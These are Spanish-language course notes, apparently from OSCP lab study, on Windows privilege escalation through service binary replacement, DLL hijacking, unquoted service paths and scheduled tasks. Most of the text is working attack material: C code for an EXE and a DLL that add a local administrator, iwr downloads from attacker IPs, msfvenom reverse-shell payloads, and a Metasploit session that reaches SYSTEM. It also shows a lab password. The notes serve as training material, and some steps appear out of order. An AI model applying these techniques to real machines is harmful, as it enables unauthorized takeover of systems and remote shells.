Se puede observar en el listado anterior que los binarios de los servicios XAMPP; Apache2 y mysql se encuentran en C:\\xampp\\ en lugar de C:\\Windows\\System32.

Esto significa que el servicio se ha instalado por un usuario en lugar de venir incorporado por defecto y que a su vez, el encargado de la estructura del directorio de instalación así como de sus permisos. Esto lo podría hacer potencialmente vulnerable.

Así, checkeamos sus permisos con *icacls*:

```
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

Successfully processed 1 files; Failed processing 0 files
```

Podemos observar que todos aquellos usuarios pertenecientes al grupo de BUILTIN\\Users o NT AUTHORITY\\Authenticated Users tienen permisos de lectura y ejecución pero no de escritura con lo que no podemos alterar el binario y no es vulnerable.

```
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```

Sin embargo, BUILTIN\\Users tiene control completo (F) del binario mysqld.exe y por tanto podemos reemplazar el mismo.

Podemos crear en Kali un binario que añada un usuario en el sistema y asu vez añada este usuario al grupo de administradores:

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Lo siguiente es compilarlo:

```
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

reemplazarlo:

```
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

El siguiente paso consiste en reiniciar el servico para que una cuenta administrativa del sistema ejecute nuestro binario. Ocurre con frecuencia que aunque tenemos permisos para cambiar el binario, no tenemos permisos para manipular el flujo de ejecución del servicio pues esto está en manos de una cuenta con más privilegios.

```
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```

Sin embargo, todavía podemos buscar otras formas de reiniciar un servicio. Por ejemplo, si está configurado en modo "StartMode: Auto" se reiniciará cada vez que iniciemos la máquina:

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```

Podemos comprobar nuestros propios privilegios para saber si podemos apagar la máquina:

```
PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

El listado anterior muestra que nuestro usuario tiene el privilegio en cuestión (entre otros) y, por lo tanto, deberíamos poder iniciar un apagado o reinicio del sistema. El estado *Disabled* solo indica si el privilegio está actualmente habilitado para el proceso en ejecución. En nuestro caso, significa que nuestro usuario no ha solicitado y no está utilizando actualmente el privilegio SeShutdownPrivilege.

Si el privilegio SeShutdownPrivilege no estuviera presente, tendríamos que esperar a que la víctima iniciara manualmente el servicio, lo que sería mucho menos conveniente.

Podemos emitir un reinicio con **shutdown** y los argumentos **/r** (reiniciar en lugar de apagar) y **/t 0** (en cero segundos).

```
PS C:\Users\dave> shutdown /r /t 0 
```

Una vez que se completa el reinicio, nos conectamos nuevamente como _dave_ a través de RDP y abrimos una ventana de PowerShell. Debido al reinicio emitido y al tipo de inicio _automático_ , el servicio debería haber ejecutado el archivo ejecutable que colocamos para reemplazar el binario del servicio mysql original.

Para confirmar que nuestro ataque funcionó, enumeremos los miembros del grupo _de administradores_ locales con **Get-LocalGroupMember** para verificar si _dave2_ se creó y se agregó.

```
PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```

Este mismo procedimiento puede ser realizado con PowerUp.ps1.

En primer lugar lo transportamos a la máquina y lo importamos en nuestra sessión de powershell:

```
C:\Users\dave>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
PS C:\Users\dave> Import-Module .\PowerUp.ps1
PS C:\Users\dave> . .\PowerUp.ps1
```

Seguidamente enumeramos los servicios cuyos binarios pueden ser vulnerable a un hijacking:

```
PS C:\Users\dave> Get-ModifiableServiceFile


ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:
ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:
ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False
Name                            : edgeupdatem

ServiceName                     : GammaService
Path                            : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiableFile                  : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'GammaService'
CanRestart                      : False
Name                            : GammaService

ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
Name                            : mysql
```

Vemos que de todos los servicios, sólo mysql tiene permisos de escritura sobre un grupo de usuarios del que nosotros formamos parte. Para verificarlo podemos explorar manualmente con icacls los permisos del binario:

```
PS C:\> icacls C:\xampp\mysql\bin\mysqld.exe
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files

PS C:\> whoami /groups | findstr Users
[...]
BUILTIN\Users                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
[...]
```

No tenemos permisos para reiniciarlo pero tiene un modo de inicio automático:

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```

Y nosotros podemos reiniciar la máquina:

```
PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
[...]
SeShutdownPrivilege           Shut down the system                 Disabled
[...]
```

Recordamos que el término disabled sólo hacer referencia a si estamos haciendo uso o no del privilegio en nuestra sesión.

Así, con msfvenom creamos un payload malicioso y lo trasnferimos a la máquina:

```
PS C:\Users\dave> Invoke-WebRequest -Uri http://192.168.45.170/payload.exe -OutFile C:\xampp\mysql\bin\mysqld.exe
Invoke-WebRequest : The process cannot access the file 'C:\xampp\mysql\bin\mysqld.exe' because it is being used by
another process.
At line:1 char:1
+ Invoke-WebRequest -Uri http://192.168.45.170/payload.exe -OutFile C:\ ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], IOException
    + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\dave> Invoke-WebRequest -Uri http://192.168.45.170/payload.exe -OutFile C:\xampp\mysql\bin\mysqld.exe
```

(Observemos que tenemos que mover previamente el ejecutable porque está siendo utilizado)

Y reiniciamos la máquina previamente habiendo acrtivado un listener:

```
type C:\Users\daveadmin\Desktop\flag.txt
```

<br />

##### 2.2.2. Service DLL Hijacking.

Puede ocurrir que no tengámos un binario que sustituir. En dicho caso todavía tenemos otra alternativa. Recurrir a la sustitución de librerías compartidas. 

Las Dynamic Link Libraries (DLL) son librerías que tienen código utilizado por uno o varios programas en Windows destinadas fundamentalmente a proveer funcionalidad para desarrolladores disminuyendo al repetición de código. Es el análogo de los *Share Objects* en Unix.

Hay varios métodos que podemos usar para explotar cómo funcionan las DLL en Windows y, a menudo, pueden ser una forma efectiva de elevar nuestros privilegios. Un método es similar al vector de escalada de privilegios realizado en la sección anterior. En lugar de sobrescribir el binario, simplemente sobrescribimos una DLL que usa el binario del servicio. Sin embargo, es posible que el servicio no funcione como se esperaba porque falta la funcionalidad DLL real. En la mayoría de los casos, esto aún nos llevaría a la ejecución del código de la DLL y luego, por ejemplo, a la creación de un nuevo usuario administrativo local.

Otro método consiste en secuestra lo que se denomina como la *DLL Search Order*, que se trata de aprovecharnos de cómo el OS busca una DLL para cargar una librería maliciosa antes que la DLL original. Por ejemplo, OS Windows sigue el siguiente esquema para cargar una librería compartida:

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

Así, si fuéramos capaces de colocar una DLL en el mismo directorio en elque se ejecuta la aplicación, seríamos capaces de inducir al sistema a cargar código de una librería maliciosa en lugar de la original que se encontraría por ejemplo en el C:\\Windows directory y por tanto sería buscada más tarde.

Veamos con un ejemplo cómo aplica esto en un escenario del mundo real. 

En primer lugar, debemos identificar un binario, generalmente uno que no venga incluido en el sistema por defecto sino que esté instalado por algún usuario, por ejemplo:

```
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
                         BUILTIN\Administrators:(F)
                         CLIENTWK220\steve:(RX)
                         CLIENTWK220\offsec:(F)

Successfully processed 1 files; Failed processing 0 files
```

Ahora que hemos identificado un binario, deberíamos identificar el uso que el servicio hace de las librerías con una herramienta que se denomina Process Monitor. 

No podemos utilizar Process Monitor en el sistema objetivo porque para ello necesitaríamos de permisos elevados que es lo que estamos intentando obtener. Con lo que cogeríamos el binario BetaServ.exe y lo copiariamos sobre otra máquina bajo nuestro control y una vez en ella examinaríamos los DLLs que recoge con Process Monitor. 

Con Process Monitor filtraríamos los eventos mostrados sólo si están relacionados con BetaServ.exe y reiniciamos el servicio BetaService (que hemos configurado previamente) 

```
PS C:\Users\steve> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
```

Cuando examinamos el output de process monitor vemos que se intenta abrir una DLL denominada myDLL.dll. Sabemos que si en una llamada el sistema no encuentra la librería en cuestión entonces recurre al esquema mencionado anteriormente para intentar abrir dicha librería, comenzando por el directorio en el que se encuentra el binario con el que se ejecuta el servicio y terminando con las localizaciones de la variable de entorno PATH.

Volviendo a la máquina objetivo, como nuestro binario se encuentra en C:\\Users\\Steve\\Documents, que es el usuario con el que tenemos acceso a la máquina, sabemos que busca una DLL denominada myDLL.dll y que el primer sitio en el que el sistema va a buscarla es en el mismo directorio en el que se encuentra el binario asociado al servicio. 

Así, construimos el siguiente código en C:

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Lo compilamos:

```
kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Y lo transportamos sobre el directorio en cuestión:

```
PS C:\Users\steve> cd Documents

PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
daveadmin                DefaultAccount           Guest
offsec                   steve                    WDAGUtilityAccount
The command completed successfully.
```

<br />

```
PS C:\Users\steve\Documents> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
WARNING: Waiting for service 'BetaService (BetaService)' to start...

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve\Documents> net localgroup administrators
...
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

<br />

##### 2.2.3. Unquoted Service Path.

Ya hemos visto que, en relación al flujo de ejecución de un servicio, podemos sustituir el binario asociado al servicio (o en su defecto, alguna librería que el binario utilice) para inducir a la cuenta que maneja el servicio (que supuestamente es de una cuenta de privilegios elevados) ejecute nuestro código.

Sin embargo puede ocurrir que no tengamos permisos de escritura ni sobre un binario ni tampoco sobre ninguna librería. Sin embargo, si el sistema tiene configurado los servicios de manera descuidada todavía podemos inducir al sistema para que ejecute un binario a nuestra elección a la hora de iniciar un determinado servicio.

Cuando se inicia un servicio y se crea un proceso, se utiliza la función _CreateProcess_ de Windows. Revisando el primer parámetro de la función, _lpApplicationName_ se usa para especificar el nombre y, opcionalmente, la ruta al archivo ejecutable. Si la cadena proporcionada contiene espacios y no está entre comillas, se puede interpretar de varias maneras porque no está claro para la función dónde termina el nombre del archivo y comienzan los argumentos. Para determinar esto, la función comienza interpretando el camino de izquierda a derecha hasta llegar a un espacio. Para cada espacio en la ruta del archivo, la función usa la parte anterior como nombre de archivo agregando **.exe** y el resto como argumentos.

Mostremos esto en un ejemplo con la ruta binaria del servicio sin comillas **C:\\Program Files\\My Program\\My Service\\service.exe**. Cuando Windows inicia el servicio, utilizará el siguiente orden para intentar iniciar el archivo ejecutable debido a los espacios en la ruta.

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

Para explotar esto y subvertir la llamada de servicio original sin comillas, debemos crear un ejecutable malicioso, colocarlo en un directorio que corresponda a una de las rutas interpretadas y hacer coincidir su nombre con el nombre del archivo interpretado. Luego, una vez que se inicia el servicio, nuestro archivo se ejecuta con los mismos privilegios con los que se inicia el servicio. A menudo, esta es la cuenta _LocalSystem_ , lo que da como resultado un ataque exitoso de escalada de privilegios.

En el contexto del ejemplo, podríamos nombrar nuestro ejecutable **Program.exe** y ubicarlo en **C:\\** , **My.exe** y ubicarlo en **C:\\Program Files\\** , o **My.exe** y ubicarlo en **C:\\Program Files \\Mi Programa\\** . Sin embargo, las dos primeras opciones requerirían algunos permisos poco probables ya que los usuarios estándar no tienen los permisos para escribir en estos directorios de manera predeterminada. La tercera opción es más probable ya que es el directorio principal del software. Si un usuario administrativo o desarrollador establece los permisos para este directorio demasiado abiertos, podemos colocar nuestro binario malicioso allí.

Ahora que tenemos una comprensión básica de esta vulnerabilidad, usémosla en un ejemplo. Nos conectamos a CLIENTWK220 como _steve_ (contraseña _securityIsNotAnOption++++++_ ) con RDP. Abrimos PowerShell y enumeramos los servicios en ejecución y detenidos.

```
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

Name                      State   PathName
----                      -----   --------
...
GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
...
```

El Listado 67 muestra un servicio detenido llamado _GammaService_ . La ruta binaria del servicio sin comillas contiene varios espacios y, por lo tanto, es potencialmente vulnerable a este vector de ataque.

Una forma más efectiva de identificar espacios en las rutas y comillas que faltan es usar la utilidad _de línea de comandos WMI_ (WMIC).

```
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName                                                                     
...                                                                                                         
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

El comando anterior selecciona los atributos 'name' y 'pathname' de la lista de servicios instalados en la máquina, seguidamente, con *findstr* elimina de la lista aquellos que se encuentren en o en algún subdirectorio del directorio 'C:\\Windows\\' y de ahí, elimina todas aquellas líneas que contengan comillas dobles.

Lo siguiente es verificar que nuestro usuario posee permisos para detener el servicio:

```
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```

El resultado del comando anterior verifica que nuestro usuario efectivamente puede iniciar y detener el servicio. 

Así, siguiendo la teoría anterior sabemos que el sistema a la hora de intentar ejecutar el binario asociado al servicio lleva a cabo la siguiente búsqueda de ejecutables  de acuerdo al path:

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Así, deberíamos intentar colar algún ejecutable con alguno de esos nombres en dichos directorios para conseguir ejecutar código arbitrario en el sistema.

Revisamos nuestros derechos de escritura sobre cadauno de estos escritorios con icacls:

```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Afortunadamente, nuestro usuario dispone de permisos para escribir sobre uno de dichos directorios. Generamos el código malicioso como lo hesmo hecho en anteriores veces y lo transferimos a la máquina

 ```
PS C:\Users\steve> iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe

PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

Seguidamente reiniciamos el servicio y comprobamos los efectos:

```
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
    
PS C:\Users\steve> net user

Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

Podemos repetir este mismo proceso con PowerUp.

Primero, nos logeamos en la máquina con el usuario steve:securityIsNotAnOption++++++, transferimos el script de PowerUp.ps1:

```
C:\Users\steve>powershell -ep bypass                                                                                    Windows PowerShell                                                                                                      Copyright (C) Microsoft Corporation. All rights reserved.                                                               
Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\steve> Invoke-WebRequest -Uri http://192.168.45.241/PowerUp.ps1 -OutFile PowerUp.ps1
PS C:\Users\steve> dir


    Directory: C:\Users\steve


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
[...]
-a----         5/26/2023   3:13 AM         600580 PowerUp.ps1


PS C:\Users\steve> Import-Module .\PowerUp.ps1
PS C:\Users\steve> . .\PowerUp.ps1
PS C:\Users\steve>
```

Seguidamente ejecutamos el comando 'Invoke-AllChecks':

```
ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
Check          : Unquoted Service Paths
```

De entre los resultados obtenemos que existe un servicio vulnerable a 'Unquoted Service Paths' según el campo 'Check' y además podemos reiniciarlo. 

De esta forma, revisamos el path del ejecutable:

```
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

De esta forma, sabemos que el sistema va a intentar ejecutar los siguientes programas en busca del ejecutable asociado al servicio:

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Así, comprobamos nuestros permisos sobre los directorios antecedentes:

```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W) <---
```

De esta forma, vemos que tenemos permisos sobre el directorio "Enterprise Apps", de esta forma, podemos escribir un ejecutable malicioso en "C:\\Program Files\\Enterprise Apps\\Current.exe" y reiniciar el servicio.

```
kali@kali:~/OSCP$ msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=192.168.45.241 LPORT=4444 > payload.exe; python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.208.220 - - [26/May/2023 07:02:56] "GET /payload.exe HTTP/1.1" 200 -
```

<br />

```
PS C:\Users\steve> Invoke-WebRequest -Uri http://192.168.45.241/payload.exe -OutFile "C:\Program Files\Enterprise Apps\Current.exe"
PS C:\Users\steve> Restart-Service GammaService
Restart-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start service
GammaService on computer '.'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service], Ser
   viceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.RestartServiceCommand
```

<br />

```
kali@kali:~/OSCP$ msfconsole -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; run"


       =[ metasploit v6.3.10-dev                          ]
+ -- --=[ 2306 exploits - 1205 auxiliary - 412 post       ]
+ -- --=[ 968 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the edit command to open the 
currently active module in your editor
Metasploit Documentation: https://docs.metasploit.com/

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => tun0
LPORT => 4444
[*] Started reverse TCP handler on 192.168.45.241:4444 
[*] Sending stage (175686 bytes) to 192.168.208.220
[*] Meterpreter session 1 opened (192.168.45.241:4444 -> 192.168.208.220:55333) at 2023-05-26 07:03:10 -0400

meterpreter > shell
Process 2052 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

It is worth to mention that when we span a shell when we initiate a service we have to migrate of process in order to prevent that our shell terminate abruptly because the service process exit.

<br />


#### 2.3. Abusing Other Windows Components.

##### 2.3.1. Scheduled Tasks.

Windows utiliza un *Task Scheduler* para ejecutar tareas automatizadas de mantenimiento o administración, estos son, tareas programadas (Scheduled Tasks). 

Para ejecutar estas tareas se emplea un desencadenante que con frecuencia suele ser el tiempo aunque también pueden ser una serie de eventos que ocurren en el sistema con relativa frecuencia como; el logeo de un usuario, el reinicio del sistema, el inicio/terminación de un servicio, etc.

En lo relativo a un atacante nos interesan tres piezas de información para identificar un vector de escalado de privilegios:

- Con qué usuario (con qué privilegios) se ejecuta la tarea en cuestión.
- Qué eventos desencadenan la tarea.
- Qué acciones se realizan cuando se ejecuta la tarea programada en cuestion.

La primera opción nos ayuda a saber si podremos elevar privilegios, la segunda nos ayudará a saber si utiliza la tarea está a nuestro alcance y la tercera nos ayuda a saber qué exploit utilizar si es que podemos utilizar alguno.

Veámos un caso práctico. Primero, listamos todas las tareas programas en la CMD:

```
PS C:\Users\steve> schtasks /query /fo LIST /v
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
```

Podemos que en el fragmento anterior existe una tarea programada. Prestando atención a los distintos campos que la componen podemos observar que:

- La tarea se ejecuta en el contexto de seguridad del usuario daveadmin.
- Se ejecutará la siguiente vez: 7/11/2022 2:47:21 AM.
- La tarea ejecuta: C:\\Users\\steve\\Pictures\\BackendCacheCleanup.exe.

De estas tres características se desprende que esta es una tarea que podemos aprovechar para elevar privilegios, el segundo punto nos permite deducir que está a nuestro alcance hacer uso de ella, la tercera nos expone un exploit. 

Revisando los permisos que tenemos sobre el ejecutable

```
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe 

NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
CLIENTWK220\steve:(I)(F)
CLIENTWK220\offsec:(I)(F)
```

Podemos observar que, como el usuario steve, tenemos full control sobre el ejecutable, de esta forma, podemos sustituirlo por un binario malicios y esperar a que ocurran los desencadenantes para que se ejecute nuestro binario:

```
kali@kali:~/OSCP$ tun0=$(hostname -I | cut -d " " -f2);msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$tun0 LPORT=4444 > payload.exe; python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.224.220 - - [27/May/2023 13:18:39] "GET /payload.exe HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

<br />

```
PS C:\Users\steve> iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe

PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak

PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
```

<br />

##### 2.3.2. Using exploits.

Si tenemos el SeImpersonatePrivilege habilitado en nuestra cuenta, podemos utilizar  **PrintSpoofer64.exe** para elevar privilegios.

<br />

**Capstone Exercise: Get access to _CLIENTWK222_ (VM #2) by connecting to the bind shell on port 4444. Use the methods covered in this Module to elevate your privileges to an administrative user. Enter the flag, which is located in C:\\Users\\enterpriseadmin\\Desktop\\flag.txt**.

Primero, realizamos una elevcación de privilegios lateral enumerando notas sensibles:

```ps1
